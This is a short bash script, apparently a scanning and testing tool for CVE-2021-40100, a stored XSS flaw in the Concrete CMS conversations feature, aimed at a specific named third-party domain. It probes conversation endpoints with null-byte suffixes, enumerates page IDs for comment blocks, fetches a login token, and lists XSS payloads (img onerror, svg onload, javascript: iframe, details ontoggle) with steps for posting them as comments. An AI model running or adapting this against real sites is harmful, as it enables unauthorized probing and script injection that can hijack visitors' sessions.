#!/bin/bash
# CVE-2021-40100: Stored XSS in Conversations (Rich Text Editor)
# Severity: High
# Affected: < 8.5.6

echo "=== CVE-2021-40100: Testing XSS in Conversations (Rich Text) ==="

echo -e "\n[1] Finding conversation/comment endpoints..."
curl -s "https://jobs.dnv.com/index.php/ccm/system/dialogs/conversation/subscribe%00" -v
curl -s "https://jobs.dnv.com/index.php/ccm/system/dialogs/conversation/add_message%00" -v

echo -e "\n[2] Checking for conversation blocks on pages..."
for i in $(seq 1 50); do
    PAGE=$(curl -s "https://jobs.dnv.com/index.php?cID=$i%00")
    if echo "$PAGE" | grep -q "conversation"; then
        echo "Page cID=$i has conversation block"
        echo "$PAGE" | grep -oP 'cnvID=\d+' | head -1
    fi
done

echo -e "\n[3] Testing XSS payloads in conversation..."
# Get fresh token
TOKEN=$(curl -c /tmp/cookies_conv.txt -s "https://jobs.dnv.com/index.php/login%00" | grep -oP 'name="ccm_token" value="\K[^"]+')

# Rich text XSS payloads
PAYLOADS=(
    '<img src=x onerror=alert(document.domain)>'
    '<svg/onload=alert(1)>'
    '<iframe src=javascript:alert(1)>'
    '<details open ontoggle=alert(1)>'
)

echo -e "\n[*] Manual testing required:"
echo "    1. Find a page with conversations/comments enabled"
echo "    2. Check if 'Rich Text' editor is active (not just plain text)"
echo "    3. Submit comment with XSS payload"
echo "    4. Common payloads:"
for payload in "${PAYLOADS[@]}"; do
    echo "       - $payload"
done
